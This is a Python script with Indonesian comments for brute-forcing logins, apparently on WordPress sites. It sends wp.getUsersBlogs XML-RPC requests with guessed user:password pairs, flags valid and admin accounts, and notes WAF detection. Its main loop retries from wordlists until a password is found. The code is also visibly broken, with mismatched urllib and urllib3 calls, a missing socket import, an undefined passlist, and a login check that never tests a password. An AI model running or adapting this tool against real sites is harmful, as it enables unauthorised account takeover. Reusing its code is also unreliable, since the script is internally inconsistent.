import os
import time
import logging
from more_itertools import tabulate
import requests
from termcolor import colored
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from concurrent.futures import ThreadPoolExecutor, as_completed
import re
import sys

import urllib3  # Tambahkan import sys

# Definisikan variabel global
total = 0
correct_pairs = {}


# Inisialisasi logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)


# Definisikan warna
YELLOW = 'yellow'
GREEN = 'green'
RED = 'red'

# Fungsi printout yang sesuai
def printout(text, color):
    print(colored(text, color))

# Fungsi utama untuk mencoba kata sandi
def PasswordAttempt(user, password, url, thread_no, verbose, debug, agent):
    global correct_pairs
    if verbose is True or debug is True:
        if debug is True:
            thready = "[Thread " + str(thread_no) + "]"
            printout(thready, YELLOW)
        print("Trying " + user + " : " + password + "\n",)
    headers = {'User-Agent': agent,
               'Connection': 'keep-alive',
               'Accept': 'text/html'
               }
    post = "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value><string>" + user + "</string></value></param><param><value><string>" + password + "</string></value></param></params></methodCall>"
    try:
        req = urllib3.request.Request(url, post.encode(), headers)
        response = urllib.request.urlopen(req, timeout=3)
        the_page = response.read()
        look_for = "isAdmin"
        try:
            splitter = the_page.split(look_for, 1)[1]
            correct_pairs[user] = password
            print("--------------------------")
            success = "[" + user + " : " + password + "] are valid credentials!  "
            adminAlert = ""
            if splitter[23] == "1":
                adminAlert = "- THIS ACCOUNT IS ADMIN"
            printout(success, GREEN)
            printout(adminAlert, RED)
            print("\n--------------------------")
        except:
            pass
    except urllib.error.URLError as e:
        if e.code == 404 or e.code == 403:
            global total
            printout(str(e), YELLOW)
            print(" - WAF or security plugin likely in use")
            total = len(passlist)
            return
        else:
            printout(str(e), YELLOW)
            print(" - Try reducing Thread count ")
            if verbose is True or debug is True:
                print(user + ":" + password + " was skipped")
    except socket.timeout as e:
        printout(str(e), YELLOW)
        print(" - Try reducing Thread count ")
        if verbose is True or debug is True:
            print(user + ":" + password + " was skipped")
    except socket.error as e:
        printout(str(e), YELLOW)
        print(" - Got an RST, Probably tripped the firewall\n",)
        total = len(passlist)
        return

def check_login(url, username, wordlist, proxies=None):
    session = requests.Session()

    # Konfigurasi proxy jika diberikan
    if proxies:
        session.proxies.update(proxies)

    # Send a GET request to the login page to retrieve the form data
    try:
        login_page_response = session.get(url)
        login_page_response.raise_for_status()  # Raise an exception for any HTTP error
    except requests.exceptions.RequestException as e:
        # Handle connection errors
        logger.error(f"Connection error occurred during login check: {e}")
        time.sleep(2)  # Menambahkan penundaan selama 2 detik sebelum mencoba kembali
        return False, None
    
def brute_force(url, username, wordlists):
    results = []
    total_combinations = sum(len(read_wordlist(file)) for file in wordlists)
    combinations_tried = 0
    password_found = False

    with ThreadPoolExecutor() as executor:
        futures = []
        for wordlist_file in wordlists:
            wordlist = read_wordlist(wordlist_file)
            futures.append(executor.submit(check_login, url, username, wordlist))

        for future in as_completed(futures):
            try:
                success, password = future.result()
            except Exception as e:
                logger.error(f"Error occurred during login check: {e}")
                continue
            
            combinations_tried += len(wordlist)
            progress = combinations_tried / total_combinations * 100
            logger.info(f"Loading: {progress:.2f}% Complete")

            if success:
                results.append((username, password, "Success"))
                password_found = True
                break

    return results, password_found

# Fungsi untuk membaca wordlist dari file
def read_wordlist(wordlist_file):
    with open(wordlist_file, 'r') as file:
        wordlist = file.read().splitlines()
    return wordlist

# Fungsi untuk memeriksa protokol dalam URL
def protocheck(url):
    url_pattern = re.compile(
        r"http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+"
    )
    if not url_pattern.match(url):
        printout("Incorrect URL. Please include the protocol in the URL.\n", YELLOW)
        return

if __name__ == "__main__":
    # ASCII Art Header with 7 different colors
    banner = """
    ██████   ██████ ███████████    █████ ██████   █████ ██████████      ███████    ██████   ██████ ███████████  
    ░░██████ ██████ ░█░░░███░░░█   ░░███ ░░██████ ░░███ ░░███░░░░███   ███░░░░░███ ░░██████ ██████ ░░███░░░░░███ 
     ░███░█████░███ ░   ░███  ░     ░███  ░███░███ ░███  ░███   ░░███ ███     ░░███ ░███░█████░███  ░███    ░███ 
     ░███░░███ ░███     ░███        ░███  ░███░░███░███  ░███    ░███░███      ░███ ░███░░███ ░███  ░██████████  
     ░███ ░░░  ░███     ░███        ░███  ░███ ░░██████  ░███    ░███░███      ░███ ░███ ░░░  ░███  ░███░░░░░███ 
     ░███      ░███     ░███        ░███  ░███  ░░█████  ░███    ███ ░░███     ███  ░███      ░███  ░███    ░███ 
     █████     █████    █████    ██ █████ █████  ░░█████ ██████████   ░░░███████░   █████     █████ █████   █████
    ░░░░░     ░░░░░    ░░░░░    ░░ ░░░░░ ░░░░░    ░░░░░ ░░░░░░░░░░      ░░░░░░░    ░░░░░     ░░░░░ ░░░░░   ░░░░░ 
    """
    colored_banner = colored(banner, "yellow", attrs=["bold", "underline"])
    print(colored_banner)

    # Masukkan URL dan username
    url = input("Masukkan URL: ")
    username = input("Masukkan username: ")

    # Daftar file wordlist yang akan digunakan
    wordlist_files = []
    for i in range(1, 794):
        wordlist_files.append(f"db/wordlist_1.txt")

    # Buat log file
    log_filename = "brute_force_log.txt"
    log_file = open(log_filename, "a")

    proxies = {
        'http': 'http://proxy.example.com:8080',
        'https': 'https://proxy.example.com:8080'
    }

    # Tulis informasi ke log file
    log_file.write(f"URL: {url}\n")
    log_file.write(f"Username: {username}\n\n")
    log_file.write("Brute Force Log:\n")

    # Jalankan fungsi brute_force dengan URL, username, dan file wordlist yang diberikan
    start_time = time.time()
    while True:
        brute_force_results, password_found = brute_force(url, username, wordlist_files)
        if password_found:
            break
        else:
            print("No password found. Restarting brute force...")
            log_file.write("No password found. Restarting brute force...\n")
    end_time = time.time()

    # Tampilkan hasil dalam bentuk tabel
    table_headers = ["Username", "Password", "Status"]
    table_data = brute_force_results
    table = tabulate(table_data, headers=table_headers, tablefmt="fancy_grid")
    print(table)

    # Tampilkan nama wordlist yang digunakan
    print("\nWordlist used:")
    for file in wordlist_files:
        print(file)

    # Tampilkan waktu yang dibutuhkan
    execution_time = end_time - start_time
    print(f"\nExecution time: {execution_time:.2f} seconds")

    # Tulis waktu eksekusi ke log file
    log_file.write(f"\nExecution time: {execution_time:.2f} seconds\n")

    # Tutup log file
    log_file.close()

    # Tampilkan lokasi log file
    print(f"\nLog file saved: {os.path.abspath(log_filename)}")
